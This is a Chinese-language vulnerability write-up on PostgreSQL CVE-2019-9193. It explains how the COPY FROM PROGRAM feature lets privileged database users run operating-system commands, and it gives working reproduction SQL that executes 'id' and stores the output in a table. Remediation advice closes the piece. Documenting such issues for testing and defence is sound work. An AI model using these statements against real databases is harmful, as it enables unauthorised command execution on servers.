# PostgreSQL 高权限命令执行漏洞(CVE-2019-9193)

# 漏洞简介

**PostgreSQL是功能强大的数据库软件，可在所有主要操作系统上运行，包括Linux，Windows，Mac OS X等。所公开的漏洞存在于命令“COPY TO / FROM PROGRAM”中，用于导入和导出数据。在“pg_read_server_files”组中的用户执行上述命令之后，可以获得数据库超级用户权限，从而执行任何系统命令**

# 漏洞影响版本

PostgreSQL 9.3-11.2





# 产生原因

PostgreSQL 9.3中添加的COPY … PROGRAM的功能，此功能允许被授予超级用户或pg_execute_server_program的用户作为PostgreSQL服务器运行的操作系统用户(通常是“postgres”)执行操作。但由于开发者可能很多时候并不会按照最佳实践创建角色，容易导致基于超级用户权限去运行应用，因此容易引发任意代码执行




# 漏洞复现

**前提：需要知道对方数据库密码，通过配置文件或其他途径**



远程连接对方postgres数据库

![image-20220430182307789](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220430182307789.png)

执行如下语句，FROM PROGRAM语句将执行命令id并将结果保存在cmd_exec表中

```
DROP TABLE IF EXISTS cmd_exec;
 
CREATE TABLE cmd_exec(cmd_output text);
 
COPY cmd_exec FROM PROGRAM 'id';
 
SELECT * FROM cmd_exec;
```

![image-20220430182356137](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220430182356137.png)

**具体过程：**

```
DROP TABLE IF EXISTS cmd_exec;		//执行删除你想用来保存命令输出但是可能存在的表，这一步可有可无
 
CREATE TABLE cmd_exec(cmd_output text);		//创建用来保存命令输出的表
 
COPY cmd_exec FROM PROGRAM 'id';		//通过 “COPY FROM PROGRAM”执行系统命令

SELECT * FROM cmd_exec;		//将结果显示出来
```

![image-20220430182503504](C:\Users\雷神\AppData\Roaming\Typora\typora-user-images\image-20220430182503504.png)

**成功执行命令**

# 修复方案

1.建议升级至最新版本

2.控制数据库权限禁止普通用户执行命令